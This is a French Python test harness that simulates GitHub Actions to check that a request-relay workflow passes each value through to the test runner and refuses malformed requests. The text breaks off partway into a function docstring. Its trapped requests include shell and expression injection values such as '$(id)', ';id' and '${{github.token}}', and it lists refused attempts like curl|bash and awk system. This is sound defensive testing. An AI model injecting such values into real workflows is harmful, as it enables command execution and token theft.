#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""EPREUVES_DU_RELAIS_DES_SERIES — Dim 08-11-2026 (Paris). Simulation uniquement.

LE SENS EN TÊTE. Une seule propriété : CE QUE LIT LE JOUEUR = CE QUE DIT LA DEMANDE (et la table des séries pour ce
que la demande ne dit pas). Le lot 262 a été arrêté (relevé du Chat n°298, 07-11-2026) parce qu'à chaque tour un
relecteur neuf trouvait un nouvel endroit où deux réglages s'intervertissaient sans qu'aucune épreuve ne rougisse
(D-10, N-1, J1/J2, NV-1, NV-2). Cette épreuve suit donc chaque valeur d'une demande à travers TOUS les passages, tels
que le fabricant les écrit, jusqu'à la fonction de lecture du joueur lui-même ; ses sabotages intervertissent deux
valeurs à chaque passage, et chacun doit la faire rougir.

① RÔLE — Éprouver, au dépôt, la chaîne « fichier de demande → relais demande_de_serie.yml → bouton du circuit des
  séries → pas « Fabriquer la matrice » → pas « Jouer la part » et « Rassembler » → lecture des arguments par
  tests/outils/jouer_une_part.py et tests/outils/rassembler_les_parts.py », et le filet du fabricant pour le relais
  (méthode du bloc 2 du 08-11-2026, actions 3 à 5 ; choix n°347 : Q1 = 1, Q2 = 1, Q3 = 1, Q5 = 1).
② CONTEXTE D'APPEL — Chaque nuit par la certification (épreuve de tests/ qui accepte --saboter) ; à la main avant
  toute livraison qui touche le fabricant du circuit public, la table des séries, le joueur ou le rassembleur des
  parts (R-731) : python3 tests/EPREUVES_DU_RELAIS_DES_SERIES_Dim_08-11-2026.py <racine> [--saboter]
③ ENTRÉE — La racine d'un dépôt : on y prend programmes/FABRIQUER_LE_CIRCUIT_PUBLIC.py (ses gabarits RELAIS et SERIES,
  son filet), tests/LANCEMENT_DES_EPREUVES.json (la table), tests/outils/jouer_une_part.py et
  tests/outils/rassembler_les_parts.py (leur `lire_les_arguments`).
④ CONDITIONS D'ENTRÉE — bash, git et jq installés (comme sur les machines de GitHub) ; aucun réseau.
⑤ SORTIE — Le code de sortie : 0 si chaque cas (T, V, P, L, F ci-dessous) donne la réponse attendue et, avec
  --saboter, si chaque sabotage en fait échouer au moins un ; 1 sinon ; 2 si un sabotage ne s'applique plus.
  [rend: 1]
⑥ TRAITEMENT — GitHub est imité ainsi : pour chaque demande, un vrai dépôt git (la branche publique), un commit qui
  porte la demande ; le script du pas « relayer » est EXTRAIT du relais fabriqué et joué par « bash -e -o pipefail »
  (le shell de « shell: bash ») avec l'environnement de son bloc « env: », dont chaque expression « ${{ … }} » est
  remplacée par la valeur du contexte imité (github.event.before, github.sha, github.ref_name…) ; « gh » est un faux
  qui note ses arguments et, à « run list », applique avec jq le filtre « --jq » reçu à une liste JSON de passages
  imités (tour 2, N1 de Cowork : P27 refusé pour un passage in_progress, queued, waiting, pending ou requested). Les arguments de « gh workflow run » deviennent les entrées du bouton, contrôlées comme
  GitHub le ferait contre les entrées DÉCLARÉES du circuit des séries fabriqué (inconnue, choix hors liste, nombre
  illisible : refus ; absente : valeur par défaut). Le pas « Fabriquer la matrice », extrait du même fichier fabriqué,
  est joué avec ces entrées sur une copie minimale de la version (la table, le joueur des parts, un fichier vide par
  épreuve de la table) ; sa sortie « matrice » donne, ligne par ligne, l'environnement du pas « Jouer la part », joué
  avec un faux « unshare » qui note la ligne de commande ; cette ligne est lue par `lire_les_arguments` DU JOUEUR
  (Q3 = 1) ; de même « series » → « Rassembler » → `lire_les_arguments` du rassembleur. L'attendu est calculé à
  part, depuis la demande et la table lue en JSON par cette épreuve.
  T0 (cas réel, R-732) : la table de la racine dit, pour HL et Yahoo, l'épreuve, les machines et le lot du circuit
  en service avant le 08-11-2026 (series_longues.yml publié : entrées parts_hl 18, lot_hl 6, parts_yahoo 2,
  lot_yahoo 21 ; motifs "HISTORIQUE_LONG" et "COURS_PROPRE_DE_YAHOO" du pas matrice) — le TÉMOIN ci-dessous.
  Depuis le 11-11-2026 (plan V7, bloc 2bis), T0 ne compare que les séries du témoin : la table en porte d'autres.
  V (demandes valides) : V1 la demande réelle prévue au premier passage (méthode §4, action 7 : Yahoo, 2 machines,
  lots de 21) sur main · V2 « toutes », quatre nombres tous différents entre eux et des valeurs de la table, sur une
  version en attente · V3 HL seul, sans nombre (valeurs de la table), avec une ligne vide, un commentaire et sans fin
  de ligne finale · V4 « a_blanc=oui » : rien n'est lancé, le journal dit les valeurs · V5 Yahoo, clés dans un autre
  ordre. Pour chaque V : un seul « gh workflow run », sur la branche, version = branche ; chaque part 0..n-1 lue une
  fois ; nb_parts, lot, épreuve et relevé lus par le joueur = l'attendu ; épreuve et relevé lus par le rassembleur =
  ceux des parts de la même série ; les séries jouées = celles demandées.
  P (demandes piégées, chacune refusée, SANS aucun « gh workflow run », et pour SA raison : un fragment du message) :
  accent, tabulation, retour chariot, DEL, octet nul, valeur trop longue, clé donnée deux fois (NV-2), clé
  « version » (Q2 : la version est le nom de la branche), « ; », « $( ) », « ${{ }} », série inconnue ou à la mauvaise
  casse, nombres 0, 100 et 07, clé « serie » absente, « a_blanc » faux, deux fichiers dans le commit, deux commits
  dans la poussée, un nom hors de demandes/SERIE_<date>.txt, un fichier modifié et non ajouté, une branche créée par
  la poussée, une branche qui n'est pas une version, un passage des séries en cours, plus de 1 000 octets.
  E (l'examen à la demande, décision de Jean-Luc du 08-11-2026 à 18h06) : E0 le circuit de certification a un bouton
  sans entrée obligatoire · E1 « circuit=examen » sur main → un seul « gh workflow run certifier_la_version.yml --ref
  main », sans réglage, compte des passages pris sur ce circuit · E2 à blanc → rien · E3 depuis une version en attente,
  E4 avec un réglage de série, E5 un examen en attente, E6 circuit inconnu, E7 clé circuit absente → refusés. Les
  demandes des cas V et P reçoivent « circuit=series » en tête (`relayer`).
  L (lecture du joueur et du rassembleur) : L1 « --lot » donné deux fois → refusé (NV-2) · L2 « --lot » absent →
  refusé (plus de valeur cachée) · L3 « --depuis » deux fois au rassembleur → refusé.
  F (le filet du fabricant) : F0 il accepte les gabarits fabriqués · F1 relais + une ligne qui porte la clé · F2
  relais + « ${{ … }} » dans son script · F3 relais + un programme du dépôt lancé · F4 relais + « defaults: » · F5
  le gabarit des séries + « actions: write » · F6 le gabarit des séries + le motif tapé « HISTORIQUE_LONG » (NV-1) ·
  (tour 2, I-2) F7 relais + clonage du dépôt privé · F8 « run: » sans bloc · F9 un pas « run » sans « shell: bash » ·
  F10 « $GITHUB_ENV » · F11 une poussée · F12 un second job aux pas indentés de huit qui lance python3 et une
  expression (cas du relecteur, B1) · F13 la clé écrite par un échappement YAML · F14 « permissions » au niveau du
  job : chacun refusé — depuis le tour 3 (superviseur R-759, « ARRÊTER ET SIMPLIFIER »), tous pour la même raison :
  le relais n'est pas, octet pour octet, le texte fabriqué.
  A (tour 3) : les essais du superviseur (uses tiers, curl|bash, awk system, alias de git, gh api, gh extension
  install, checkout tiers et tar, self-hosted, core.pager, une espace ajoutée) → refusés par l'empreinte ; A0 le
  relais fabriqué accepté. R (tour 3) : `refus_des_circuits_publies` sur un clone public d'essai : R1 les circuits
  fabriqués → 0 refus ; R2 relais modifié, R3 autre circuit avec actions: write, R4 write-all, R5 entre guillemets,
  R6 copie exacte du relais sous un autre nom, R7 (tour 4) un circuit sans « permissions: », R8 (tour 4)
  « Actions: Write » → 1 refus chacun. Tour 3, sur la relecture de Cowork du tour 2 : V6
  une demande d'exactement 1 000 octets passe (C3) ; P29 un passage en attente derrière 30 passages finis est vu (le
  faux gh applique « --limit », C7) ; G1 à G4 les réglages du GABARIT du relais, que l'empreinte ne garde pas :
  déclencheur push sur demandes/ seul (N5), ubuntu-latest (N5), fetch-depth 2 et persist-credentials false (N7), gh
  employé seulement pour « run list » et « workflow run », un seul job (N6).
  V0 (tour 2, I-1) : le bouton appuyé sans relais, seule la version donnée : les défauts DÉCLARÉS du bouton mènent
  le joueur aux valeurs de la table. P28 (tour 2, m-3) : une demande qui règle une série qu'elle ne joue pas. Le
  rassembleur : « --depuis » et « --travail » comparés aussi (tour 2, m-2).
⑦ UNITÉ — Des codes de sortie.
⑧ POURQUOI — Méthode du bloc 2, action 5 (« UNE épreuve qui suit chaque valeur de la demande jusqu'au joueur ») ;
  décision n°309 ; le lot 262 arrêté (n°298). Une épreuve qui reste verte quand on retire ce qu'elle teste n'est pas
  une preuve : d'où un sabotage par passage, qui intervertit deux valeurs.
⑨ CE QUI CLOCHE — Rien n'est joué sur GitHub : le déclencheur « push », le filtre « paths », la permission
  « actions: write », le vrai « gh », la conversion par GitHub des entrées « number » et de la matrice JSON en texte
  sont IMITÉS (niveau 1 et 2 de la méthode, action 7). Le pas matrice tourne sous bash et non sous ETAPE_MUETTE.
  « LC_ALL=C » du relais n'est pas éprouvé seul : le contrôle ASCII le précède et refuse tout octet hors de l'ASCII
  (seule la locale « C.utf8 » existe sur la machine du Chat). La course entre deux relais (le premier lance, le
  passage n'est pas encore listé quand le second regarde) n'est pas éprouvée : THÉORIQUE.
⑩ EFFET — Écrit dans des dossiers jetables, effacés à la fin.
⑪ TERMINAISON — Rend la main ; chaque lancement est borné à 120 secondes ; sort par sys.exit.
  [sort: oui]
"""
import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile

_args = [a for a in sys.argv[1:] if not a.startswith("--")]
DEPOT = os.path.abspath(_args[0] if _args else ".")
FABRICANT = "programmes/FABRIQUER_LE_CIRCUIT_PUBLIC.py"
TABLE = "tests/LANCEMENT_DES_EPREUVES.json"
JOUEUR = "tests/outils/jouer_une_part.py"
RASSEMBLEUR = "tests/outils/rassembler_les_parts.py"
GIT_ENV = dict(os.environ, GIT_CONFIG_GLOBAL=os.devnull, GIT_CONFIG_NOSYSTEM="1", GIT_AUTHOR_NAME="essai",
               GIT_AUTHOR_EMAIL="essai@exemple.invalid", GIT_COMMITTER_NAME="essai",
               GIT_COMMITTER_EMAIL="essai@exemple.invalid")
# LE TÉMOIN (R-732, cas réel) : ce que le circuit en service jouait avant le 08-11-2026, lu ce jour-là dans
# .github/workflows/series_longues.yml du dépôt (entrées du bouton l.65-80, motifs du pas matrice l.228) et dans la
# table (clés de « series_hors_de_la_nuit »). Recopié VOLONTAIREMENT : c'est la référence fixe qui fait rougir une
# table où deux séries ont échangé leur épreuve ou leurs réglages (la table seule ne peut pas se contredire).
TEMOIN = {"HL": ("tests/EPREUVES_DE_L_HISTORIQUE_LONG_Dim_04-10-2026.py", 18, 6),
          "Yahoo": ("tests/EPREUVES_DU_COURS_PROPRE_DE_YAHOO_Jeu_22-10-2026.py", 2, 21)}
HORODATAGE = r"(?:Lun|Mar|Mer|Jeu|Ven|Sam|Dim)_[0-9]{2}-[0-9]{2}-[0-9]{4}_[0-9]{2}h[0-9]{2}"
NOM = "demandes/DEMANDE_2026-11-08_17h00.txt"
# Le faux gh (tour 2, relecture de Cowork du 08-11-2026, N1) : à « run list », il rend la LISTE JSON des passages
# imités (FAUX_GH_PASSAGES) passée par le filtre « --jq » qu'il a reçu, appliqué par jq, comme le vrai gh ; avant,
# il imprimait un compte tout fait et le filtre du relais n'était jamais éprouvé.
FAUX_GH = '''#!/usr/bin/env python3
import json, os, subprocess, sys
a = sys.argv[1:]
with open(os.environ["FAUX_GH_JOURNAL"], "a", encoding="utf-8") as f:
    f.write(json.dumps({"args": a, "repo": os.environ.get("GH_REPO"), "jeton": os.environ.get("GH_TOKEN")}) + "\\n")
if a[:2] == ["run", "list"]:
    if "--jq" not in a or "--json" not in a or a[a.index("--json") + 1] != "status":
        sys.exit("faux gh : run list sans --json status ou sans --jq")
    passages = json.loads(os.environ.get("FAUX_GH_PASSAGES", "[]"))
    if "--limit" in a:
        passages = passages[:int(a[a.index("--limit") + 1])]   # le plus récent d'abord, comme gh
    p = subprocess.run(["jq", "-r", a[a.index("--jq") + 1]], input=json.dumps(passages),
                       capture_output=True, text=True)
    sys.stdout.write(p.stdout)
    sys.exit(p.returncode)
'''
FAUX_UNSHARE = '''#!/usr/bin/env python3
import json, os, sys
with open(os.environ["FAUX_UNSHARE_JOURNAL"], "a", encoding="utf-8") as f:
    f.write(json.dumps(sys.argv[1:]) + "\\n")
sys.exit(int(os.environ.get("FAUX_UNSHARE_CODE", "0")))
'''

# Les demandes : (nom, branche, texte, attendu) ; attendu = None (acceptée) ou le fragment du message de refus.
# Les cas de forme de la poussée (deux fichiers, deux commits…) sont traités à part dans `tour`.
VALIDES = [
    ("V1 la demande réelle du premier passage", "main", "serie=Yahoo\nparts_yahoo=2\nlot_yahoo=21\n"),
    ("V2 toutes, quatre nombres distincts", "travail-essai",
     "serie=toutes\nparts_hl=3\nlot_hl=13\nparts_yahoo=4\nlot_yahoo=11\n"),
    ("V3 HL seul, valeurs de la table", "main", "# premier essai\n\nserie=HL"),
    ("V4 a blanc", "main", "serie=toutes\nparts_hl=5\nlot_hl=9\na_blanc=oui\n"),
    ("V5 clés dans un autre ordre", "main", "lot_yahoo=7\nparts_yahoo=5\nserie=Yahoo\n"),
]
PIEGEES = [
    ("P01 accent", "serie=Yahoo\nlot_yahoo=7é\n", "ASCII"),
    ("P02 tabulation", "serie=Yahoo\nlot_yahoo=\t7\n", "ASCII"),
    ("P03 retour chariot", "serie=Yahoo\r\nlot_yahoo=7\r\n", "ASCII"),
    ("P04 DEL", "serie=Yahoo\x7f\n", "ASCII"),
    ("P05 octet nul", "serie=Yahoo\x00\n", "ASCII"),
    ("P06 valeur de 21 caractères", "serie=" + "A" * 21 + "\n", "illisible"),
    ("P07 clé donnée deux fois (NV-2)", "serie=HL\nlot_hl=13\nlot_hl=11\n", "deux fois"),
    ("P08 clé version (Q2)", "serie=HL\nversion=main\n", "inconnue"),
    ("P09 point-virgule", "serie=HL;id\n", "illisible"),
    ("P10 substitution", "serie=$(id)\n", "illisible"),
    ("P11 expression de GitHub", "serie=${{github.token}}\n", "illisible"),
    ("P12 série à la mauvaise casse", "serie=hl\n", "serie inconnue"),
    ("P13 série inconnue", "serie=lesdeux\n", "serie inconnue"),
    ("P14 nombre 0", "serie=HL\nparts_hl=0\n", "1 a 99"),
    ("P15 nombre 100", "serie=HL\nlot_hl=100\n", "1 a 99"),
    ("P16 nombre 07", "serie=Yahoo\nparts_yahoo=07\n", "1 a 99"),
    ("P17 clé serie absente", "parts_hl=3\n", "manque"),
    ("P18 a_blanc faux", "serie=HL\na_blanc=peut\n", "a_blanc"),
    ("P19 plus de 1000 octets", "serie=HL\n" + "#" * 79 + "\n" * 1 + ("#" * 79 + "\n") * 12, "octets"),
    ("P20 espace autour du signe égal", "serie = HL\n", "illisible"),
    ("P28 elle règle une série qu'elle ne joue pas (m-3)", "serie=HL\nparts_yahoo=5\n", "qu'elle ne joue pas"),
]


def lancer(args, env=None, cwd=None, entree=None):
    """Lance une commande ; rend (code, sortie et erreur réunies).

    ① RÔLE — Un lancement borné. ② CONTEXTE D'APPEL — Partout. ③ ENTRÉE — `args`, `env` (GIT_ENV par défaut), `cwd`,
    `entree` (texte envoyé sur l'entrée). ④ CONDITIONS D'ENTRÉE — —
    ⑤ SORTIE — DEUX valeurs : le code, le texte. [rend: 2]
    ⑥ TRAITEMENT — subprocess.run, borné à 120 s. ⑦ UNITÉ — — ⑧ POURQUOI — —
    ⑨ CE QUI CLOCHE — Un dépassement lève TimeoutExpired : l'épreuve sort sur une trace, code non nul.
    ⑩ EFFET — Ce que fait la commande. ⑪ TERMINAISON — Rend la main ; 120 s au plus. [sort: non]
    """
    p = subprocess.run(args, capture_output=True, text=True, env=env or GIT_ENV, cwd=cwd, timeout=120, input=entree,
                       errors="replace")
    return p.returncode, p.stdout + p.stderr


def charger(chemin, nom):
    """Charge un programme comme un module.

    ① RÔLE — Appeler les fonctions de la racine éprouvée. ② CONTEXTE D'APPEL — `tour`. ③ ENTRÉE — `chemin`, `nom`.
    ④ CONDITIONS D'ENTRÉE — — ⑤ SORTIE — UNE valeur : le module. [rend: 1] ⑥ TRAITEMENT — importlib ; le dossier du
    programme est mis en tête de sys.path le temps de l'import (le rassembleur importe jouer_une_part par son nom).
    ⑦ UNITÉ — — ⑧ POURQUOI — Q3 = 1 : lire avec la fonction du joueur lui-même.
    ⑨ CE QUI CLOCHE — Le code de tête du programme s'exécute (le fabricant lit la table à l'import) ; un module
    « jouer_une_part » déjà importé d'une autre racine serait repris : il est retiré de sys.modules avant.
    ⑩ EFFET — — ⑪ TERMINAISON — Rend la main, ou lève. [sort: non]
    """
    sys.modules.pop("jouer_une_part", None)
    sys.path.insert(0, os.path.dirname(chemin))
    try:
        spec = importlib.util.spec_from_file_location(nom, chemin)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
    finally:
        sys.path.pop(0)
    return module


def pas_du_gabarit(texte, ident):
    """Rend (environnement brut, script) du premier pas d'identifiant `ident` d'un circuit fabriqué.

    ① RÔLE — Jouer le pas tel que le circuit le porte, sans le recopier.
    ② CONTEXTE D'APPEL — `tour`, pour « relayer », « matrice », « jouer_la_part », « rassembler ».
    ③ ENTRÉE — `texte` : le fichier de circuit ; `ident` : la valeur de « id: ».
    ④ CONDITIONS D'ENTRÉE — Le pas porte « id: », puis éventuellement « env: », puis « run: | ».
    ⑤ SORTIE — DEUX valeurs : {nom : valeur écrite} du bloc « env: » du pas, et le script (sans son indentation) ;
      (None, "") si le pas manque. [rend: 2]
    ⑥ TRAITEMENT — lecture par indentation : la ligne « id: <ident> », le bloc « env: » à la même marge, ses lignes
      « NOM: valeur » plus indentées, puis « run: | » et les lignes plus indentées que lui.
    ⑦ UNITÉ — — ⑧ POURQUOI — Fiche en tête.
    ⑨ CE QUI CLOCHE — Pas un lecteur YAML ; une valeur d'environnement entre guillemets garde ses guillemets.
    ⑩ EFFET — — ⑪ TERMINAISON — Rend la main. [sort: non]
    """
    lignes = texte.split("\n")
    debut = [i for i, l in enumerate(lignes) if l.strip() == "id: " + ident]
    if not debut:
        return None, ""
    i = debut[0]
    marge = len(lignes[i]) - len(lignes[i].lstrip())
    env = {}
    while i < len(lignes) and lignes[i].strip() != "run: |":
        if lignes[i].strip() == "env:" and len(lignes[i]) - len(lignes[i].lstrip()) == marge:
            k = i + 1
            while k < len(lignes) and len(lignes[k]) - len(lignes[k].lstrip()) > marge:
                nom, _, valeur = lignes[k].strip().partition(": ")
                env[nom] = valeur
                k += 1
            i = k
            continue
        i += 1
    if i == len(lignes):
        return None, ""
    corps = []
    for l in lignes[i + 1:]:
        if l.strip() and len(l) - len(l.lstrip()) <= marge:
            break
        corps.append(l[marge + 2:])
    return env, "\n".join(corps) + "\n"


def resoudre(env, contexte):
    """Remplace chaque valeur « ${{ expression }} » d'un bloc « env: » par sa valeur dans le contexte imité.

    ① RÔLE — Imiter GitHub, qui remplace les expressions d'un bloc « env: » avant de lancer le pas.
    ② CONTEXTE D'APPEL — `tour`, avant chaque pas joué.
    ③ ENTRÉE — `env` : {nom : valeur écrite} ; `contexte` : {expression : valeur}.
    ④ CONDITIONS D'ENTRÉE — —
    ⑤ SORTIE — UNE valeur : {nom : texte}. Lève KeyError pour une expression absente du contexte. [rend: 1]
    ⑥ TRAITEMENT — une valeur qui est exactement « ${{ x }} » prend contexte[x], convertie en texte comme GitHub (un
      entier « 3 », un texte tel quel) ; une autre valeur reste telle quelle.
    ⑦ UNITÉ — — ⑧ POURQUOI — Un sabotage qui branche une variable sur une autre expression doit changer la valeur lue.
    ⑨ CE QUI CLOCHE — Une expression composée (« a || b ») n'est pas évaluée : elle lève KeyError.
    ⑩ EFFET — — ⑪ TERMINAISON — Rend la main, ou lève. [sort: non]
    """
    sortie = {}
    for nom, valeur in env.items():
        m = re.fullmatch(r"\$\{\{ ([^}]+) \}\}", valeur)
        sortie[nom] = str(contexte[m.group(1)]) if m else valeur
    return sortie


def entrees_declarees(series):
    """Rend {nom : (type, options, défaut, obligatoire)} des entrées « workflow_dispatch » du circuit des séries.

    ① RÔLE — Imiter le contrôle que GitHub fait des entrées données à « gh workflow run ».
    ② CONTEXTE D'APPEL — `tour`, une fois.
    ③ ENTRÉE — `series` : le texte du circuit des séries fabriqué.
    ④ CONDITIONS D'ENTRÉE — Le bloc « inputs: » à quatre espaces, chaque entrée à six, ses clés à huit.
    ⑤ SORTIE — UNE valeur : le dictionnaire. [rend: 1]
    ⑥ TRAITEMENT — lecture par indentation ; « options » lu en JSON ; « default » sans ses guillemets.
    ⑦ UNITÉ — — ⑧ POURQUOI — Une entrée envoyée mais non déclarée est refusée par GitHub ; une entrée déclarée et non
      envoyée prend son défaut : l'attendu dépend des deux.
    ⑨ CE QUI CLOCHE — Pas un lecteur YAML.
    ⑩ EFFET — — ⑪ TERMINAISON — Rend la main. [sort: non]
    """
    lignes = series.split("\n")
    i = lignes.index("    inputs:") + 1
    entrees, nom = {}, None
    while i < len(lignes) and (lignes[i].startswith("      ") or not lignes[i].strip()):
        l = lignes[i]
        m = re.match(r"^      ([a-z_]+):$", l)
        if m:
            nom = m.group(1)
            entrees[nom] = {"type": "string", "options": None, "default": None, "required": False}
        m = re.match(r"^        (type|options|default|required): (.*)$", l)
        if m and nom:
            cle, v = m.groups()
            entrees[nom][cle] = (json.loads(v) if cle == "options" else v.strip('"') if cle == "default" else
                                 v == "true" if cle == "required" else v)
        i += 1
    return entrees


def tour(racine):
    """Joue tous les cas sur une racine ; rend la liste des cas faux (vide : tout est conforme).

    ① RÔLE — Le corps de l'épreuve (fiche en tête, ⑥).
    ② CONTEXTE D'APPEL — `main`, une fois sur la racine, puis une fois par copie sabotée.
    ③ ENTRÉE — `racine`.
    ④ CONDITIONS D'ENTRÉE — Fiche en tête, ④.
    ⑤ SORTIE — UNE valeur : la liste des cas faux, chacun avec ce qui a été lu. [rend: 1]
    ⑥ TRAITEMENT — Fiche en tête, ⑥.
    ⑦ UNITÉ — — ⑧ POURQUOI — Fiche en tête.
    ⑨ CE QUI CLOCHE — Une erreur imprévue d'un cas (pas extrait absent, expression inconnue…) est rangée parmi les
      cas faux avec son message : elle ne fait jamais passer l'épreuve.
    ⑩ EFFET — Écrit dans un dossier jetable, effacé à la fin.
    ⑪ TERMINAISON — Rend la main. [sort: non]
    """
    faux = []
    d = tempfile.mkdtemp(prefix="relais_series_")
    try:
        try:
            F = charger(os.path.join(racine, FABRICANT), "FABRICANT_EPROUVE")
            J = charger(os.path.join(racine, JOUEUR), "JOUEUR_DES_PARTS_EPROUVE")
            R = charger(os.path.join(racine, RASSEMBLEUR), "RASSEMBLEUR_EPROUVE")
        except Exception as e:   # noqa: BLE001 — tout échec de chargement est un cas faux
            return [f"chargement : {type(e).__name__} : {e}"]
        if F.RELAIS is None or F.SERIES is None:
            return [f"le fabricant n'a pas fabriqué ses gabarits : {F.ERREUR_DE_LA_TABLE}"]
        table = json.load(open(os.path.join(racine, TABLE), encoding="utf-8"))
        # l'attendu : la table lue ICI, en JSON, sans le fabricant
        ref = {}
        for epreuve, e in table["series_hors_de_la_nuit"].items():
            s = e.get("serie_du_circuit")
            if isinstance(s, dict):
                ref[s.get("code")] = (epreuve, s.get("machines"), s.get("lot"), e.get("releve"))
        # T0 : le cas réel — HL et Yahoo seulement : la table peut porter d'autres séries (bloc 2bis du plan V7,
        # 11-11-2026, agent E : séries Boucle et Signaux ajoutées), le témoin ne dit que ce que jouait le circuit
        # en service avant le 08-11-2026 ; une série du témoin disparue de la table reste un écart
        if {c: v[:3] for c, v in ref.items() if c in TEMOIN} != TEMOIN:
            faux.append(f"T0 la table ne dit plus ce que jouait le circuit en service : {ref}")
        entrees = entrees_declarees(F.SERIES)
        outils = os.path.join(d, "outils")
        os.makedirs(outils)
        for nom, texte in (("gh", FAUX_GH), ("unshare", FAUX_UNSHARE)):
            open(os.path.join(outils, nom), "w").write(texte)
            os.chmod(os.path.join(outils, nom), 0o755)
        version = os.path.join(d, "version")   # la copie minimale de la version jouée par le pas matrice
        os.makedirs(os.path.join(version, "tests", "outils"))
        shutil.copyfile(os.path.join(racine, TABLE), os.path.join(version, TABLE))
        shutil.copyfile(os.path.join(racine, JOUEUR), os.path.join(version, JOUEUR))
        for epreuve in table["series_hors_de_la_nuit"]:
            open(os.path.join(version, epreuve), "w").close()
        env_relais, script_relais = pas_du_gabarit(F.RELAIS, "relayer")
        env_matrice, script_matrice = pas_du_gabarit(F.SERIES, "matrice")
        env_jouer, script_jouer = pas_du_gabarit(F.SERIES, "jouer_la_part")
        env_rass, script_rass = pas_du_gabarit(F.SERIES, "rassembler")
        if None in (env_relais, env_matrice, env_jouer, env_rass):
            return faux + ["un pas du relais ou du circuit des séries est introuvable (relayer, matrice, "
                           "jouer_la_part, rassembler)"]
        compteur = [0]

        def depot(branche, fichiers, autres_commits=0, nouvelle_branche=False, modifier=False):
            """Rend (avant, après, dossier) d'une poussée imitée : un dépôt, sa pointe d'avant, le commit poussé.

            ① RÔLE — Fabriquer la branche publique et la poussée que le relais reçoit.
            ② CONTEXTE D'APPEL — `relayer`, une fois par cas.
            ③ ENTRÉE — `branche` ; `fichiers` : [(chemin, octets)] du commit poussé ; `autres_commits` : commits de code avant lui ; `nouvelle_branche` : pointe d'avant nulle ; `modifier` : la demande existe déjà à la base.
            ④ CONDITIONS D'ENTRÉE — —
            ⑤ SORTIE — TROIS valeurs : pointe d'avant (40 zéros si nouvelle branche), commit poussé, dossier. [rend: 3]
            ⑥ TRAITEMENT — git init, un commit de base, les commits demandés.
            ⑦ UNITÉ — —
            ⑧ POURQUOI — Les gardes ① du relais (un seul commit, un seul fichier ajouté) se jugent sur un vrai historique git.
            ⑨ CE QUI CLOCHE — Un « git » qui échoue n'est pas signalé ici : le relais le verra (commit absent).
            ⑩ EFFET — Écrit dans le dossier jetable du tour.
            ⑪ TERMINAISON — Rend la main. [sort: non]
            """
            compteur[0] += 1
            r = os.path.join(d, f"public_{compteur[0]}")
            lancer(["git", "init", "-q", "-b", branche, r])
            open(os.path.join(r, "LISEZMOI.txt"), "w").write("base\n")
            if modifier:
                os.makedirs(os.path.join(r, "demandes"))
                open(os.path.join(r, NOM), "w").write("serie=HL\n")
            lancer(["git", "-C", r, "add", "-A"])
            lancer(["git", "-C", r, "commit", "-q", "-m", "base"])
            avant = "0" * 40 if nouvelle_branche else lancer(["git", "-C", r, "rev-parse", "HEAD"])[1].strip()
            for k in range(autres_commits):
                open(os.path.join(r, f"code_{k}.py"), "w").write("x = 1\n")
                lancer(["git", "-C", r, "add", "-A"])
                lancer(["git", "-C", r, "commit", "-q", "-m", "code"])
            for chemin, octets in fichiers:
                os.makedirs(os.path.dirname(os.path.join(r, chemin)), exist_ok=True)
                open(os.path.join(r, chemin), "wb").write(octets)
            lancer(["git", "-C", r, "add", "-A"])
            lancer(["git", "-C", r, "commit", "-q", "-m", "demande"])
            return avant, lancer(["git", "-C", r, "rev-parse", "HEAD"])[1].strip(), r

        def relayer(branche, fichiers, en_cours='[{"status": "completed"}, {"status": "completed"}]', circuit=True,
                    **forme):
            """Joue le relais sur une poussée imitée ; rend (code, sortie, appels de gh).

            ① RÔLE — Jouer le pas « relayer » du relais fabriqué comme GitHub le jouerait sur cette poussée.
            ② CONTEXTE D'APPEL — `tour`, pour chaque cas V et P.
            ③ ENTRÉE — `branche`, `fichiers`, `en_cours` (ce que le faux gh répond au compte des passages en cours), `forme` (passé à `depot`).
            ④ CONDITIONS D'ENTRÉE — —
            ⑤ SORTIE — TROIS valeurs : code du pas, sa sortie, la liste des appels de gh ({args, repo, jeton}). [rend: 3]
            ⑥ TRAITEMENT — contexte github.* imité ; environnement du bloc « env: » résolu ; bash -e -o pipefail ; le faux gh en tête du PATH.
            ⑦ UNITÉ — —
            ⑧ POURQUOI — Fiche en tête, ⑥.
            ⑨ CE QUI CLOCHE — Le PATH réel suit le faux : une commande absente de la machine manquerait comme sur GitHub, pas davantage.
            ⑩ EFFET — Écrit dans le dossier jetable du tour.
            ⑪ TERMINAISON — Rend la main. [sort: non]
            """
            # le circuit (ajout du 08-11-2026, 18h06) : une demande sans « circuit= » reçoit « circuit=series » en tête,
            # sauf `circuit=False` (cas P32) — les demandes des séries écrites avant l'ajout restent lisibles ici
            if circuit:
                fichiers = [(c, o if c != NOM or b"circuit=" in o else b"circuit=series\n" + o) for c, o in fichiers]
            avant, apres, r = depot(branche, fichiers, **forme)
            rt = os.path.join(d, f"rt_{compteur[0]}")
            os.makedirs(rt)
            journal = os.path.join(rt, "gh.jsonl")
            contexte = {"github.event.before": avant, "github.sha": apres, "github.ref_name": branche,
                        "github.repository": "essai/public", "github.token": "jeton-fictif-du-passage"}
            env = dict(GIT_ENV, PATH=outils + os.pathsep + os.environ["PATH"], RUNNER_TEMP=rt,
                       FAUX_GH_JOURNAL=journal, FAUX_GH_PASSAGES=en_cours, **resoudre(env_relais, contexte))
            c, o = lancer(["bash", "--noprofile", "--norc", "-e", "-o", "pipefail", "-c", script_relais], env=env, cwd=r)
            appels = [json.loads(l) for l in open(journal, encoding="utf-8")] if os.path.exists(journal) else []
            return c, o, appels

        def lances(appels):
            """Rend les appels « gh workflow run » d'une liste d'appels de gh.

            ① RÔLE — Isoler les lancements.
            ② CONTEXTE D'APPEL — `tour`.
            ③ ENTRÉE — `appels` : la liste rendue par `relayer`.
            ④ CONDITIONS D'ENTRÉE — —
            ⑤ SORTIE — UNE valeur : la sous-liste. [rend: 1]
            ⑥ TRAITEMENT — filtre sur les deux premiers arguments.
            ⑦ UNITÉ — —
            ⑧ POURQUOI — Un refus se juge à ZÉRO lancement, une acceptation à UN.
            ⑨ CE QUI CLOCHE — —
            ⑩ EFFET — Aucun.
            ⑪ TERMINAISON — Rend la main. [sort: non]
            """
            return [a for a in appels if a["args"][:2] == ["workflow", "run"]]

        def suivre(nom, branche, demande, appel):
            """Suit un « gh workflow run » jusqu'au joueur ; rend la liste des écarts à l'attendu.

